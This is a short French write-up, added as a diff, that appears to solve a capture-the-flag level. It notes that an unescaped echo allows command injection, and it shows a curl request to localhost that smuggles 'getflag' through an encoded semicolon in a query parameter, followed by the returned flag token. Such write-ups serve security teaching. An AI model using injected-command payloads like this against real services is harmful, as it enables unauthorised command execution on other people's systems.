@@ -1,0 +1,9 @@
+Echo n’est pas protégé donc on peut injecter du code dans la variable $y via la requête.
+
+%3B pour encoder le ';' dans la requête
+
+Command:
+	curl "localhost:4747?x=test%3Bgetflag"
+Result:
+	test
+	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
